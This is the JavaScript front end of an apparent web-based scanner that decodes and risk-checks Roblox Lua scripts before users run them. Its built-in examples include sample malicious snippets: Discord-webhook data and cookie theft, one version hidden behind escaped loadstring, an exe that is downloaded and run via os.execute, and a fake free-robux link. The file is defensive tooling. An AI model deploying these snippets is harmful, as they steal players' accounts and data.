(function () {
  'use strict';
  var L = window.LuaScriptFucker, $ = function (id) { return document.getElementById(id); };
  var REPO = 'https://github.com/sxmoq/luascriptchecker';
  var DISCORD_URL = 'https://discord.gg/BqsNSjJ2b8';
  // Optional: address of your own download helper (see proxy-worker.js). Many script sites block direct downloads from a web page.
  var PROXY_URL = '';

  var VIEWS = {
    dump: ['Roblox script scanner', 'Drop a script or paste a link. We decode it layer by layer, follow what it downloads and show what it tries to do, before you run it.'],
    clean: ['Deobfuscator', 'Turn an unreadable script into something you can read.'],
    byte: ['Bytecode', 'Read the text hidden inside compiled Luau or Lua files.'],
    api: ['API', 'Use the same tools from your own JavaScript.'],
    hist: ['History', 'Scripts you recently checked.'],
    give: ['Contribute', 'Help make the scanner smarter.']
  };
  var NEEDS = { dump: 1 };
  function enc(s) { return s.replace(/[\s\S]/g, function (c) { return '\\' + c.charCodeAt(0); }); }
  var EX = {
    normal: 'local Players = game:GetService("Players")\nlocal plr = Players.LocalPlayer\nprint("Hello " .. plr.Name)\nplr.CharacterAdded:Connect(function(c) print("spawned") end)\n',
    loader: 'loadstring(game:HttpGet("https://scriptblox.com/raw/Example-Hub_abc123"))()\n',
    stealer: 'local hook = "https://discord.com/api/webhooks/123456/abcdef"\nlocal plr = game.Players.LocalPlayer\ngame:GetService("HttpService"):PostAsync(hook, plr.Name .. " " .. plr.UserId)\n',
    hidden: 'local Players = game:GetService("Players")\nloadstring("' + enc('local hook="https://discord.com/api/webhooks/123/abc" game:GetService("HttpService"):PostAsync(hook, tostring(game.Players.LocalPlayer.UserId))') + '")()\n',
    cookie: 'local c = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_ABC123"\nrequest({ Url = "https://discord.com/api/webhooks/1/x", Method = "POST", Body = c })\n',
    fake: 'local link = "https://roblox-free-robux.xyz/claim"\nsetclipboard(link)\nprint("Join our group for free robux!")\n',
    installer: 'writefile("update.exe", game:HttpGet("https://example.com/setup.exe"))\nos.execute("update.exe")\n',
    luarmor: 'script_key = "YOUR_KEY_HERE"\nloadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0123456789abcdef0123456789abcdef.lua"))()\n'
  };

  var src = '', fname = '', cur = null, tab = 'sum', layerIx = 0, catSel = 'all';

  /* ---------- icons ---------- */
  var SH = 'M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6l8-3z';
  var IC = {
    vok: SH + 'M8.5 12l2.5 2.5 4.5-5', vbad: SH + 'M9.5 9.5l5 5M14.5 9.5l-5 5', vwarn: SH + 'M12 8v4.5M12 16h.01',
    vq: SH + 'M9.8 9.6a2.3 2.3 0 014.4.9c0 1.4-2.2 1.8-2.2 3.2M12 16.6h.01',
    lock: 'M7 11V8a5 5 0 0110 0v3M5 11h14v9H5zM12 15v2',
    down: 'M12 4v11M7.5 10.5L12 15l4.5-4.5M5 19.5h14', up: 'M12 20V9M7.5 13.5L12 9l4.5 4.5M5 4.5h14',
    hidden: 'M3 3l18 18M10.7 10.7a2 2 0 002.6 2.6M9.9 5.2A9.8 9.8 0 0112 5c5 0 8.5 4 9.5 7a13 13 0 01-2.6 3.9M6.1 6.1A13.5 13.5 0 002.5 12c1 3 4.5 7 9.5 7a9.7 9.7 0 004-.9',
    info: 'M12 21a9 9 0 100-18 9 9 0 000 18zM12 8h.01M11 12h1v5h1', check: 'M5 12.5l4.5 4.5L19 7.5', warn: 'M12 4l9 16H3L12 4zM12 10v4M12 17h.01'
  };
  function svg(k) { return '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="' + IC[k] + '"/></svg>'; }

  /* ---------- helpers ---------- */
  function esc(s) { return String(s).replace(/[&<>"]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]; }); }
  function store(k, v) { try { if (v === undefined) return JSON.parse(localStorage.getItem(k)); localStorage.setItem(k, JSON.stringify(v)); } catch (e) { return null; } }
  function msg(t) { $('msg').textContent = t || ''; }
  function need() { if (!src.trim()) { msg('Add a script first: paste code or a link above, or drop a file on the box.'); return false; } msg(''); return true; }
  function dl(name, text) {
    var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' }));
    a.download = name; document.body.appendChild(a); a.click(); a.remove();
  }
  function copy(text, btn) {
    var done = function () { if (btn) { var o = btn.textContent; btn.textContent = 'Copied'; setTimeout(function () { btn.textContent = o; }, 1200); } };
    if (navigator.clipboard) navigator.clipboard.writeText(text).then(done, function () {});
    else { var t = document.createElement('textarea'); t.value = text; document.body.appendChild(t); t.select(); document.execCommand('copy'); t.remove(); done(); }
  }
  function short(s, n) { return s.length > n ? s.slice(0, n) + '…' : s; }
  function plural(n, w) { return n + ' ' + w + (n === 1 ? '' : 's'); }
  function addHist(kind, summary, text, name) {
    var h = store('lsf_hist') || [];
    h.unshift({ t: Date.now(), kind: kind, name: name || fname || 'Pasted script', summary: summary, src: (text !== undefined ? text : src).slice(0, 30000) });
    h = h.slice(0, 20);
    if (store('lsf_hist', h) === null && !store('lsf_hist')) store('lsf_hist', h.slice(0, 5));
  }
  function setSrc(text, name) {
    src = text; fname = name || ''; $('inp').value = text;
    $('fname').textContent = name || 'Script';
    $('count').textContent = text ? plural(text.split('\n').length, 'line') + ', ' + (text.length / 1024).toFixed(1) + ' KB' : '';
  }

  /* ---------- navigation ---------- */
  function show(v) {
    document.querySelectorAll('.side button').forEach(function (b) { b.classList.toggle('on', b.dataset.v === v); });
    document.querySelectorAll('.view').forEach(function (s) { s.hidden = s.id !== 'v-' + v; });
    $('inputCard').hidden = !NEEDS[v]; $('examples').hidden = !NEEDS[v];
    $('title').textContent = VIEWS[v][0]; $('sub').textContent = VIEWS[v][1];
    msg('');
    if (v === 'hist') hist();
  }

  /* ---------- report pieces ---------- */
  var VICON = { ok: 'vok', bad: 'vbad', warn: 'vwarn', pending: 'vq', dynamic: 'vq', hidden: 'vq', protected: 'lock' };
  function bandHtml(d, extra) {
    var vd = d.verdict, cls = { bad: 'bad', warn: 'warn', ok: 'ok', unknown: 'unk' }[vd.state];
    var lit = { ok: 1, warn: 2, bad: 3, unknown: 0 }[vd.state];
    var meter = '<div class="vmeter' + (lit ? '' : ' dash') + '"><div class="segs">' + [1, 2, 3].map(function (n) { return '<i' + (n <= lit ? ' class="on"' : '') + '></i>'; }).join('') + '</div>' +
      (lit ? '<div class="vlabels"><span>Low</span><span>Medium</span><span>High</span></div><div class="vscore">Risk score <b>' + d.score + '</b> out of 100</div>'
        : '<div class="vscore">Not enough to judge yet</div>') + '</div>';
    return { title: vd.title, html: '<div class="verdict ' + cls + '"><div class="vhead"><span class="vicon">' + svg(VICON[vd.kind] || 'vq') + '</span><div><h2>' + esc(vd.title) + '</h2><p>' + esc(vd.advice) + '</p></div></div>' +
      meter + (extra || '') + '</div>' };
  }
  function itemHtml(f, withLayer) {
    var where = 'line ' + f.line + (withLayer && f.layer > 0 ? ' · in: ' + f.via : '');
    return '<div class="item"><span class="dot l' + f.level + '"></span><div><div class="ih"><b>' + esc(f.title) + '</b><span class="muted">' +
      (f.count > 1 ? f.count + ' times · ' : '') + where + '</span></div><p>' + esc(f.why) + '</p>' +
      (f.snippet ? '<code class="snip">' + esc(f.snippet) + '</code>' : '') + '</div></div>';
  }
  function findingsHtml(list, withLayer) {
    var warns = list.filter(function (f) { return f.level >= 2; }), notes = list.filter(function (f) { return f.level < 2; });
    var h = warns.length ? warns.map(function (f) { return itemHtml(f, withLayer); }).join('') : '<p class="empty" style="padding:24px 0 8px">Nothing risky matched.</p>';
    if (notes.length) h += '<details class="notes"><summary>Good to know <span class="muted">(' + notes.length + ', normal in most scripts)</span></summary>' + notes.map(function (f) { return itemHtml(f, withLayer); }).join('') + '</details>';
    return h;
  }

  /* ---------- checking ---------- */
  var ROLE = { run: 'Downloads and runs', send: 'Sends data to', fetch: 'Downloads', mention: 'Mentioned' };
  var CLS_CHIP = { hub: 'hub', gate: 'hub', lib: 'ok', exfil: 'bad', tracker: 'bad', paste: 'warn', tunnel: 'warn', short: 'warn', roblox: 'ok' };
  var remote = {}, tried = {}, runId = 0, histFor = -1;
  function autoOn() { return $('autoDl').checked; }

  function dump() {
    if (!need()) return;
    remote = {}; tried = {}; runId++; tab = 'sum'; layerIx = 0; catSel = 'all'; openAcc = {};
    if (!analyze()) return;
    $('dumpOut').scrollIntoView({ behavior: 'smooth', block: 'start' });
    follow(runId);
  }
  function analyze() {
    try { cur = L.dump(src, { remote: remote }); } catch (e) { msg('Could not read this script (' + e.message + ').'); return false; }
    if (layerIx >= cur.layers.length) layerIx = 0;
    render(); return true;
  }
  // Downloads text only. The text is never run, only read.
  function fetchText(u) {
    function get(url) {
      return fetch(url, { redirect: 'follow', credentials: 'omit' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.text(); });
    }
    return get(u).catch(function (e) {
      if (!PROXY_URL) throw e;
      return get(PROXY_URL + (PROXY_URL.indexOf('?') < 0 ? '?url=' : '&url=') + encodeURIComponent(u));
    }).then(function (t) {
      if (t.length > 3000000) throw new Error('too big');
      if (/^\s*<(?:!doctype|html)/i.test(t)) throw new Error('web page');
      return t;
    });
  }
  function fetchOne(p, id) {
    tried[p.fetchUrl] = 'loading'; render();
    return fetchText(p.fetchUrl).then(function (t) { if (id === runId) { remote[p.fetchUrl] = t; tried[p.fetchUrl] = 'done'; } },
      function () { if (id === runId) tried[p.fetchUrl] = 'failed'; }).then(function () { if (id === runId) analyze(); });
  }
  function follow(id) {
    if (id !== runId || !cur) return;
    var next = autoOn() ? cur.pending.filter(function (p) { return p.auto && !p.blocked && !tried[p.fetchUrl]; })[0] : null;
    if (next) { fetchOne(next, id).then(function () { follow(id); }); return; }
    if (histFor === id) { var h = store('lsf_hist') || []; h.shift(); store('lsf_hist', h); }
    histFor = id;
    addHist('Dump', cur.verdict.title + (cur.findings.length ? ', ' + plural(cur.findings.length, 'finding') : '') + (cur.meta.layers ? ', ' + plural(cur.meta.layers, 'extra layer') : ''));
  }

  function doesHtml(d) {
    return '<h3 class="sec">What this script does</h3><ul class="does">' + d.says.map(function (s) { return '<li class="k-' + s.kind + '">' + svg(s.kind) + '<span>' + esc(s.text) + '</span></li>'; }).join('') + '</ul>';
  }
  var TIPS = {
    protected: ['Only use scripts from creators with a real community: a Discord with members, reviews, a history.', 'Try it on an alt account first, never on your main.', 'Never type your Roblox password or cookie into anything a script shows you.'],
    hidden: ['Only use it if you trust who made it. If a stranger sent it to you, don’t.', 'Try it on an alt account first, never on your main.', 'Never type your Roblox password or cookie into anything a script shows you.']
  };
  function tipsHtml(d) {
    var t = TIPS[d.verdict.kind]; if (!t) return '';
    return '<div class="tips"><b>How to stay safe</b><ul>' + t.map(function (x) { return '<li>' + esc(x) + '</li>'; }).join('') + '</ul></div>';
  }
  function pendingHtml(d) {
    if (!d.pending.length) return '';
    return '<h3>Scripts we still need to read</h3>' + d.pending.map(function (p, i) {
      var st = tried[p.fetchUrl], line;
      if (p.blocked) line = '<p>We don’t download links like this for you, because they are often tracking or shady links. Open it only if you trust it, then paste what you see.</p>';
      else if (st === 'loading') line = '<p class="muted">Downloading…</p>';
      else {
        line = (st === 'failed' ? '<p>We couldn’t download this one automatically. Many sites block that. Paste it yourself below, it takes about 20 seconds.</p>' : '') +
          '<div class="row" style="margin-top:8px">' + (st === 'failed' ? '' : '<button class="btn sm solid" data-dl="' + i + '" type="button">Download and check it</button>') +
          '<a class="btn sm" href="' + esc(p.fetchUrl) + '" target="_blank" rel="noopener noreferrer">Open link</a></div>';
      }
      return '<div class="pend"><div class="ih"><b>' + esc(p.name) + '</b><span class="muted">' + (p.layer ? 'found in a script it downloads' : 'found in your script') + '</span></div>' +
        '<code>' + esc(p.fetchUrl) + '</code>' + line +
        '<details' + (st === 'failed' || p.blocked ? ' open' : '') + '><summary>Paste it yourself</summary><ol class="steps"><li>Open the link in a new tab.</li><li>Select everything on that page and copy it.</li><li>Paste it here.</li></ol>' +
        '<textarea class="paste" spellcheck="false" aria-label="Script text"></textarea><div class="row"><button class="btn sm solid" data-add="' + i + '" type="button">Check it</button></div></details></div>';
    }).join('');
  }
  function busyHtml(d) {
    var p = d.pending.filter(function (x) { return tried[x.fetchUrl] === 'loading'; })[0];
    return p ? '<div class="busy" role="status"><i></i><span>Downloading the script from ' + esc(p.name) + '…</span></div>' : '';
  }

  var openAcc = {};
  function mergedCode() {
    var d = cur;
    return d.layers.map(function (ly, i) {
      return (d.layers.length > 1 ? '-- ===== ' + (i === 0 ? 'Your script (cleaned)' : 'Layer ' + i + ': ' + ly.via) + ' =====\n' : '') + ly.code;
    }).join('\n\n');
  }
  function sec(id, title, note) { return '<h3 class="sec" id="' + id + '">' + title + (note ? ' <span class="muted">' + note + '</span>' : '') + '</h3>'; }
  function netHtml(d) {
    if (!d.loaders.length) return '<p class="empty" style="padding:18px 0 4px">No links or network calls found.</p>';
    return d.loaders.map(function (l, i) {
      return '<div class="lk"><span class="role ' + l.role + '">' + ROLE[l.role] + '</span><div><div class="meta"><span class="chip ' + (CLS_CHIP[l.cls] || '') + '">' + esc(l.name) + '</span>' +
        (l.resolved ? '<span class="chip ok">read</span>' : '') + (l.layer ? '<span class="chip">layer ' + l.layer + '</span>' : '') + (l.count > 1 ? '<span class="chip">' + l.count + ' times</span>' : '') +
        '</div><code>' + esc(l.url) + '</code></div><button class="btn sm" data-copy="' + i + '" type="button">Copy</button></div>';
    }).join('');
  }
  function catsHtml() {
    var d = cur, cats = {}; d.calls.forEach(function (c) { cats[c.cat] = (cats[c.cat] || 0) + 1; });
    return '<button class="btn sm' + (catSel === 'all' ? ' on' : '') + '" data-cat="all" type="button">All ' + d.calls.length + '</button>' +
      Object.keys(d.catLabels).filter(function (k) { return cats[k]; }).map(function (k) {
        return '<button class="btn sm' + (catSel === k ? ' on' : '') + '" data-cat="' + k + '" type="button">' + d.catLabels[k] + ' ' + cats[k] + '</button>';
      }).join('');
  }
  function body() { var c = $('catBar'); if (c) c.innerHTML = catsHtml(); callsList(); }

  function render() {
    document.querySelectorAll('#dumpOut details[data-k]').forEach(function (x) { openAcc[x.dataset.k] = x.open; });
    var d = cur, o = d.obfuscation, links = d.loaders.length, n = d.meta.layers, code = mergedCode();
    var warns = d.findings.filter(function (f) { return f.level >= 2; }).length;
    var facts = '<div class="facts"><span><b>' + esc(o.label) + '</b>' + (o.families.length ? ' (' + esc(o.families.join(', ')) + ')' : '') + '</span>' +
      '<span><b>' + n + '</b> extra ' + (n === 1 ? 'layer' : 'layers') + ' read</span><span><b>' + links + '</b> ' + (links === 1 ? 'link' : 'links') + '</span>' +
      '<span><b>' + d.meta.lines + '</b> ' + (d.meta.lines === 1 ? 'line' : 'lines') + ', ' + (d.meta.bytes / 1024).toFixed(1) + ' KB</span></div>';
    var tech = '';
    if (d.iocs.ips.length) tech += '<h4>IP addresses</h4><ul class="list">' + d.iocs.ips.map(function (ip) { return '<li><code>' + esc(ip) + '</code></li>'; }).join('') + '</ul>';
    if (d.iocs.assets.length) tech += '<h4>Roblox asset IDs</h4><ul class="list">' + d.iocs.assets.map(function (a) { return '<li><code>' + esc(a.id) + '</code><span class="chip">' + esc(a.kind) + '</span></li>'; }).join('') + '</ul>';
    $('dumpOut').innerHTML = busyHtml(d) + bandHtml(d, facts).html +
      '<nav class="jump" aria-label="On this page"><a href="#sec-does">Summary</a><a href="#sec-net">Network</a><a href="#sec-warn">Warnings</a><a href="#sec-code">Code</a><a href="#sec-more">Details</a></nav>' +
      '<div id="sec-does">' + doesHtml(d) + '</div>' + tipsHtml(d) + pendingHtml(d) +
      sec('sec-net', 'Network activity', '(' + links + ')') + '<div class="hint">Links are never opened for you unless you press Download. We never run what they return, only read it.</div>' + netHtml(d) +
      sec('sec-warn', 'Warnings', '(' + warns + ')') + findingsHtml(d.findings, true) +
      sec('sec-code', 'Decoded code', n ? '(' + plural(n, 'extra layer') + ' unpacked, all in this one file)' : '') +
      '<div class="codewrap"><div class="etop"><span class="fname">' + (d.layers.length > 1 ? 'All layers in one file' : 'Your script (cleaned)') + '</span><span class="muted">' + plural(code.split('\n').length, 'line') + '</span><span class="grow"></span>' +
      '<button class="btn sm" data-act="copy-code" type="button">Copy</button><button class="btn sm" data-act="save-code" type="button">Save .lua</button></div>' +
      '<textarea class="codebox" id="codeBox" readonly spellcheck="false" aria-label="Decoded code"></textarea></div>' +
      '<p class="muted">Escapes, split strings and hex numbers are decoded so the text is readable.</p>' +
      sec('sec-more', 'More details') +
      '<details class="acc" data-k="obf"><summary>Obfuscation <span class="muted">(' + esc(o.label) + ', score ' + o.score + ' out of 100)</span></summary>' +
        (o.signals.length ? '<ul class="sig">' + o.signals.map(function (x) { return '<li>' + esc(x) + '</li>'; }).join('') + '</ul>' : '<p class="muted">Nothing here looks scrambled.</p>') + '</details>' +
      (tech ? '<details class="acc" data-k="tech"><summary>IP addresses and asset IDs</summary>' + tech + '</details>' : '') +
      '<details class="acc" data-k="strs"><summary>All text <span class="muted">(' + d.strings.length + ')</span></summary><div class="toolbar"><input class="srch" id="strQ" type="search" placeholder="Search text" aria-label="Search text"><label class="chk"><input type="checkbox" id="strHid"> Only text revealed by decoding</label></div><ul class="list" id="strList"></ul></details>' +
      '<details class="acc" data-k="calls"><summary>All function calls <span class="muted">(' + d.calls.length + ')</span></summary><div class="toolbar cats" id="catBar"></div><ul class="list" id="callList"></ul></details>' +
      '<div class="row"><button class="btn sm" data-act="summary" type="button">Copy summary</button><button class="btn sm" data-act="report" type="button">Save report (.txt)</button><button class="btn sm" data-act="json" type="button">Save as JSON</button></div>';
    $('codeBox').value = code; strs(); body();
    document.querySelectorAll('#dumpOut details[data-k]').forEach(function (x) { if (openAcc[x.dataset.k]) x.open = true; });
  }

  function strs() {
    var q = ($('strQ').value || '').toLowerCase(), only = $('strHid').checked;
    var list = cur.strings.filter(function (s) { return (!only || s.hidden) && (!q || s.text.toLowerCase().indexOf(q) >= 0); });
    $('strList').innerHTML = list.length ? list.slice(0, 300).map(function (s) {
      return '<li><code>' + esc(short(s.text, 180)) + '</code>' + (s.hidden ? '<span class="chip hub">decoded</span>' : '') + (s.count > 1 ? '<span class="muted">×' + s.count + '</span>' : '') + '</li>';
    }).join('') + (list.length > 300 ? '<li class="muted">Showing the first 300 of ' + list.length + '. Use the search to narrow it down.</li>' : '') : '<li class="muted">No text matches.</li>';
  }
  function callsList() {
    var list = cur.calls.filter(function (c) { return catSel === 'all' || c.cat === catSel; });
    $('callList').innerHTML = list.length ? list.slice(0, 250).map(function (c) {
      return '<li><code>' + esc(c.text) + '</code><span class="chip">' + cur.catLabels[c.cat] + '</span><span class="muted">×' + c.count + '</span></li>';
    }).join('') : '<li class="muted">No function calls found.</li>';
  }

  function reportText() {
    var d = cur;
    var out = ['LuaScriptFucker report', 'File: ' + (fname || 'pasted script'), 'Verdict: ' + d.verdict.title, d.verdict.advice, '', 'What this script does:']
      .concat(d.says.map(function (s) { return '- ' + s.text; }));
    out.push('', 'Findings:');
    out = out.concat(d.findings.length ? d.findings.map(function (f) { return '- ' + f.title + ' (line ' + f.line + ', ' + f.via + '): ' + f.why; }) : ['- none']);
    out.push('', 'Links:');
    out = out.concat(d.loaders.length ? d.loaders.map(function (l) { return '- [' + ROLE[l.role] + '] ' + l.name + ': ' + l.url + (l.resolved ? ' (read)' : ''); }) : ['- none']);
    return out.join('\n');
  }

  $('dumpOut').addEventListener('click', function (e) {
    var b = e.target.closest('button'); if (!b || !cur) return;
    if (b.dataset.tab) { tab = b.dataset.tab; render(); }
    else if (b.dataset.layer) { layerIx = +b.dataset.layer; body(); }
    else if (b.dataset.cat) { catSel = b.dataset.cat; body(); }
    else if (b.dataset.copy) copy(cur.loaders[+b.dataset.copy].url, b);
    else if (b.dataset.dl) { var p = cur.pending[+b.dataset.dl]; if (p) fetchOne(p, runId).then(function () { follow(runId); }); }
    else if (b.dataset.add) {
      var p2 = cur.pending[+b.dataset.add], ta = b.closest('.pend').querySelector('textarea');
      if (!p2) return;
      if (!ta.value.trim()) { msg('Paste the script text into the box first.'); return; }
      msg(''); remote[p2.fetchUrl] = ta.value; tried[p2.fetchUrl] = 'done'; analyze(); follow(runId);
    }
    else if (b.dataset.act === 'summary') copy(reportText(), b);
    else if (b.dataset.act === 'copy-code') copy(mergedCode(), b);
    else if (b.dataset.act === 'save-code') dl('decoded.lua', mergedCode());
    else if (b.dataset.act === 'report') dl('report.txt', reportText());
    else if (b.dataset.act === 'json') dl('report.json', JSON.stringify(cur, null, 2));
  });
  $('dumpOut').addEventListener('input', function (e) { if (e.target.id === 'strQ') strs(); });
  $('dumpOut').addEventListener('change', function (e) { if (e.target.id === 'strHid') strs(); });

  /* ---------- bytecode ---------- */
  function readBytes(f) {
    if (!f) return; var fr = new FileReader();
    fr.onload = function () {
      var res = L.bytecode(new Uint8Array(fr.result)), html = '', texts = res.strings.join('\n');
      html += '<dl class="kv"><dt>File</dt><dd>' + esc(f.name) + '</dd><dt>Type</dt><dd>' + esc(res.kind) + '</dd><dt>Size</dt><dd>' + (res.size / 1024).toFixed(1) + ' KB</dd>' +
        (res.version ? '<dt>Bytecode version</dt><dd>' + res.version + '</dd>' : '') +
        '<dt>How text was found</dt><dd>' + (res.parsed ? 'Read from the bytecode’s string table' : 'Scanned the file for readable text') + '</dd></dl>';
      var title = res.kind;
      if (res.strings.length) {
        var d = L.dump(texts), b = bandHtml(d); title = b.title;
        html += b.html + doesHtml(d) + '<h3>What was found</h3>' + findingsHtml(d.findings, false) + '<h3>Text found (' + res.strings.length + ')</h3><ul class="list">' +
          res.strings.slice(0, 300).map(function (t) { return '<li><code>' + esc(short(t, 180)) + '</code></li>'; }).join('') + '</ul>';
      } else html += '<p class="empty">No readable text found in this file.</p>';
      $('byteOut').innerHTML = html;
      addHist('Bytecode', title, texts, f.name);
    };
    fr.readAsArrayBuffer(f);
  }

  /* ---------- history ---------- */
  function hist() {
    var h = store('lsf_hist') || [];
    $('histOut').innerHTML = h.length ? h.map(function (e, i) {
      return '<div class="hrow"><span class="tag">' + esc(e.kind) + '</span><div class="grow"><b>' + esc(e.name) + '</b><div class="muted">' + esc(e.summary) + ' · ' + new Date(e.t).toLocaleString() + '</div></div><button class="btn sm" data-i="' + i + '" type="button">Open</button></div>';
    }).join('') : '<p class="empty">Nothing here yet. Check a script and it shows up here.</p>';
  }

  /* ---------- wiring ---------- */
  document.querySelectorAll('.side button').forEach(function (b) { b.addEventListener('click', function () { show(b.dataset.v); }); });
  document.querySelectorAll('[data-goto]').forEach(function (b) { b.addEventListener('click', function () { show(b.dataset.goto); }); });

  $('inp').addEventListener('input', function () { setSrc($('inp').value, ''); });
  $('bOpen').addEventListener('click', function () { $('file').click(); });
  $('bClear').addEventListener('click', function () { setSrc('', ''); cur = null; runId++; $('dumpOut').innerHTML = ''; msg(''); $('inp').focus(); });
  $('examples').addEventListener('click', function (e) {
    var b = e.target.closest('button[data-ex]'); if (!b) return;
    setSrc(EX[b.dataset.ex], ''); msg(''); dump();
  });

  function readText(f) { if (!f) return; var r = new FileReader(); r.onload = function () { setSrc(String(r.result), f.name); msg(''); }; r.readAsText(f); }
  $('file').addEventListener('change', function (e) { readText(e.target.files[0]); e.target.value = ''; });
  var ed = $('inputCard');
  ['dragenter', 'dragover'].forEach(function (ev) { ed.addEventListener(ev, function (e) { e.preventDefault(); ed.classList.add('drag'); }); });
  ['dragleave', 'drop'].forEach(function (ev) { ed.addEventListener(ev, function (e) { e.preventDefault(); ed.classList.remove('drag'); }); });
  ed.addEventListener('drop', function (e) { readText(e.dataTransfer.files[0]); });

  var bz = $('bDrop');
  bz.addEventListener('click', function () { $('bFile').click(); });
  bz.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); $('bFile').click(); } });
  $('bFile').addEventListener('change', function (e) { readBytes(e.target.files[0]); e.target.value = ''; });
  ['dragenter', 'dragover'].forEach(function (ev) { bz.addEventListener(ev, function (e) { e.preventDefault(); bz.classList.add('drag'); }); });
  ['dragleave', 'drop'].forEach(function (ev) { bz.addEventListener(ev, function (e) { e.preventDefault(); bz.classList.remove('drag'); }); });
  bz.addEventListener('drop', function (e) { readBytes(e.dataTransfer.files[0]); });

  if (store('lsf_auto') === false) $('autoDl').checked = false;
  $('autoDl').addEventListener('change', function () { store('lsf_auto', $('autoDl').checked); });
  $('bDump').addEventListener('click', dump);
  $('inp').addEventListener('keydown', function (e) { if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') dump(); });

  $('histOut').addEventListener('click', function (e) {
    var b = e.target.closest('button[data-i]'); if (!b) return;
    var h = (store('lsf_hist') || [])[+b.dataset.i]; if (!h) return;
    if (h.kind === 'Bytecode') { show('byte'); return; }
    setSrc(h.src, h.name); show('dump'); dump();
  });
  $('bWipe').addEventListener('click', function () { store('lsf_hist', []); hist(); });

  $('discordBtn').href = DISCORD_URL; $('railDiscord').href = DISCORD_URL;

  $('gSend').addEventListener('click', function () {
    var t = $('gType').value, title = $('gTitle').value.trim(), body = $('gBody').value.trim();
    if (!title) { msg('Give your suggestion a short title first.'); return; }
    msg('');
    window.open(REPO + '/issues/new?title=' + encodeURIComponent('[' + t + '] ' + title) + '&body=' + encodeURIComponent('**Type:** ' + t + '\n\n' + (body || '(no details)') + '\n\n_Sent from the LuaScriptFucker website._'), '_blank', 'noopener');
  });

  show('dump');
})();
